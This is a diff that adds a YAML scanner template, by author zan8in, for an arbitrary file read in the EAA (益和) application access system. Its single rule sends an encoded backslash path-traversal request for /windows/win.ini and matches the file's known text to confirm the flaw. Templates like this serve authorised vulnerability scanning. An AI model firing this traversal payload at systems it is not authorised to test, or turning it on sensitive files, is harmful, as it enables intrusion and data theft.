@@ -1,0 +1,17 @@
+id: eaa-fileread
+
+info:
+  name: EAA 益和应用接入系统任意文件读取
+  author: zan8in
+  severity: high
+  verified: false
+  tags: eaa,fileread
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0()
